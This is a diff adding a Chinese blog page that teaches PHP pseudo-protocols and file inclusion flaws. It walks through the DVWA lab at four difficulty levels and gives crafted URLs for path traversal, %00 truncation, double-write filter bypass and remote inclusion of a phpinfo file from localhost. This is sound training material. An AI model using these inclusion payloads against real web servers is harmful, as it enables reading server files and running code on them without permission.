@@ -1,0 +1,320 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    NYQX
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="NYQX" />
+    
+    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Ting</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(w.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >PHP伪协议+PHP文件包含</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h4 id="emsp-emsp-电脑一卡，写了两遍半。。。"><a href="#emsp-emsp-电脑一卡，写了两遍半。。。" class="headerlink" title="&emsp;&emsp;电脑一卡，写了两遍半。。。"></a>&emsp;&emsp;电脑一卡，写了两遍半。。。</h4><h4 id="emsp-emsp-活着好累。。。"><a href="#emsp-emsp-活着好累。。。" class="headerlink" title="&emsp;&emsp;活着好累。。。"></a>&emsp;&emsp;活着好累。。。</h4><p><img src="/2018/07/10/file/0.jpg" alt="0"></p>
+<hr>
+<p><br></p>
+<hr>
+<h3 id="1、PHP伪协议"><a href="#1、PHP伪协议" class="headerlink" title="1、PHP伪协议"></a>1、PHP伪协议</h3><p>&emsp;&emsp;这里说到的协议不是指网络上的TCP/IP协议，而是操作系统提供支持的一种协议，类似标准协议HTTP, FTP。自定义协议叫做伪协议。<br><strong>伪协议格式：</strong>zzz://xxxxxx</p>
+<h4 id="认识"><a href="#认识" class="headerlink" title=" 认识"></a><1> 认识</1></h4><p><strong>PHP伪协议总和：</strong></p>
+<blockquote>
+<p>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br><em>php:// — 访问各个输入/输出(I/Ostreams)</em><br><em>zlib:// — 压缩流</em><br><em>data:// — 数据(RFC 2397)</em><br>glob:// — 查找匹配的文件路径模式<br><em>phar:// — PHP 归档</em><br>ssh2:// — Secure Shell 2<br><em>rar:// — RAR</em><br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p>
+</blockquote>
+<p><strong>配置：</strong><br>&emsp;&emsp;在php.ini中两个重要的配置：<br><strong>allow_url_fopen 和 allow_url_include</strong><br>&emsp;&emsp;会影响到fopen等等和include等等函数对于伪协议的支持。</p>
+<blockquote>
+<p>allow_url_fopen: <em>能否远程文件包含</em><br>allow_url_include: <em>能否使用伪协议</em></p>
+</blockquote>
+<hr>
+<h4 id="应用"><a href="#应用" class="headerlink" title=" 应用"></a><2> 应用</2></h4><h3 id="2、PHP文件包含"><a href="#2、PHP文件包含" class="headerlink" title="2、PHP文件包含"></a>2、PHP文件包含</h3><h4 id="基础理论"><a href="#基础理论" class="headerlink" title=" 基础理论"></a><1> 基础理论</1></h4><p>(1)<strong>PHP文件包含漏洞：</strong>在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了<strong>Web根目录以外</strong>的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p>
+<blockquote>
+<p><em>-远程文件包含RFI</em>例如?file=<a href="http://hhddj/hhd.txt" target="_blank" rel="noopener">http://hhddj/hhd.txt</a><br><em>-本地文件包含LFI</em>例如?file=../hhd.txt</p>
+</blockquote>
+<p>(2)PHP文件包含的几个函数:</p>
+<blockquote>
+<p><em>include()：</em>只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。<br><em>include_once()：</em>和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。<br><em>require()：</em>只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。<br><em>require_once()：</em>和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+</blockquote>
+<hr>
+<h4 id="方法利用"><a href="#方法利用" class="headerlink" title=" 方法利用"></a><2> 方法利用</2></h4><p>(1)%00截断：</p>
+<blockquote>
+<p>在php 5.3.4之前有效<br><em>$_GET[“filename”]</em>中常见<br>例：<em>filename=test.php%00.txt</em></p>
+</blockquote>
+<p>主要利用常见：<br>1.上传时路径必须为txt、png等结尾时。<br>2.文件下载时，绕过白名单检查。<br>3.文件包含时，截断后面限制(主要是本地包含时)。<br>注：magic_quotes_gpc = Off时，可以使用%00绕过。magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符”\”。</p>
+<p>(2)根目录搜寻：</p>
+<blockquote>
+<p><em>/../../../../../../www/dvwa/php.ini</em></p>
+</blockquote>
+<p>前面必须加/，表示从根目录开始。当不知道具体路径时，加尽可能多的../(也不要太多…)。</p>
+<p>(3)双写重构造：</p>
+<blockquote>
+<p><em>…/./</em>代替<em>../</em></p>
+</blockquote>
+<p>(4)file包含：</p>
+<blockquote>
+<p>file://协议：本地包含文件(将绝对路径下的文件包含进来)</p>
+</blockquote>
+<p><em>利用：</em><br>1.上传一个内容为php的文件<br>2.利用file协议去包含上传文件(需要知道上传文件的绝对路径)。<br>3.实现任意命令执行。</p>
+<hr>
+<h4 id="DVWA实验练习"><a href="#DVWA实验练习" class="headerlink" title=" DVWA实验练习"></a><3> DVWA实验练习</3></h4><p>下面对四种级别的代码进行分析：</p>
+<h5 id="Low"><a href="#Low" class="headerlink" title="Low:"></a><strong>Low:</strong></h5><blockquote>
+<p>源代码中，服务器端对page参数没有做任何的过滤跟检查。<br><em>漏洞利用：</em></p>
+<blockquote>
+<p><em>1.</em>本地文件包含<br><em>绝对路径：</em><br>通过报错，获得服务器文件的绝对路径，构造url：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=E:\phpstudy\PHPTutorial\WWW\www\dvwa\php.ini</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>成功读取了服务器的php.ini文件。<br><em>相对路径：</em><br>构造url：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=\..\..\..\..\..\..\..\www\dvwa\php.ini</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>尽可能多的..\以保证到达服务器的根目录，但也不要过多。<br>读取成功。<br><em>注意：</em>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断。</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><em>2.</em>远程文件包含：<br>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。<br>在远程服务器127.0.0.1上传一个phpinfo.txt文件，内容如下：  </p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><img src="/2018/07/10/file/3.jpg" alt="3"></p>
+</blockquote>
+</blockquote>
+<hr>
+<blockquote>
+<blockquote>
+<p>构造url：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>成功在服务器上执行了phpinfo函数。<br>如图：  </p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><img src="/2018/07/10/file/4.jpg" alt="4"></p>
+</blockquote>
+</blockquote>
+<hr>
+<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium:"></a><strong>Medium:</strong></h5><blockquote>
+<p>源代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// “、”https://“、 “ ../“、”..\”替换为空字符，即删除。<br><em>漏洞利用：</em><br>双写重构造：</p>
+<blockquote>
+<p><em>1.</em>本地文件包含：<br><em>绝对路径：</em><br>因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的,构造url:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=E:\phpstudy\PHPTutorial\WWW\www\dvwa\php.ini</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>读取成功。<br><em>相对路径：</em><br>构造url：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=\...\.\...\.\...\.\...\.\...\.\www\dvwa\php.ini</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>读取成功。<br><em>2.</em>远程文件包含：<br>构造url：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=htthttp://p://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>远程执行命令成功。</p>
+</blockquote>
+</blockquote>
+<h5 id="High"><a href="#High" class="headerlink" title="High:"></a><strong>High:</strong></h5><blockquote>
+<p>源代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。<br><em>漏洞利用：</em><br>利用file协议，构造url(需要知道上传文件的绝对路径)：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/www/dvwa/vulnerabilities/fi/?page=file:///E:\phpstudy\PHPTutorial\WWW\www\dvwa\php.ini</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<h5 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible:"></a><strong>Impossible:</strong></h5><blockquote>
+<p>源代码使用了白名单机制进行防护，简单粗暴，page参数必须为”include.php”、”file1.php”、”file2.php”、”file3.php”之一，彻底杜绝了文件包含漏洞。<br><em>无漏洞利用。</em></p>
+</blockquote>
+<p><strong>url图：</strong></p>
+<blockquote>
+<p><img src="/2018/07/10/file/1.jpg" alt="1"></p>
+</blockquote>
+<hr>
+<p><strong>读取成功图：</strong></p>
+<blockquote>
+<p><img src="/2018/07/10/file/2.jpg" alt="2"></p>
+</blockquote>
+<hr>
+<hr>
+<h3 id="三爷镇楼！"><a href="#三爷镇楼！" class="headerlink" title="三爷镇楼！"></a>三爷镇楼！</h3><p><img src="/2018/07/10/file/ww.jpg" alt="三笠"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 valine -->
+<div id="comment">
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#comment' ,
+        notify: true,
+        verify: false,
+        app_id: 'your appId',
+        app_key: 'your appkey',
+        placeholder: 'Please leave your footprints',
+        pageSize: '10',
+        avatar: '',
+        avatar_cdn: 'https://gravatar.loli.net/avatar/'
+    });
+</script>
+</div>
+<style>
+   #comment{
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+            	<span id="busuanzi_container_site_pv">2018总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
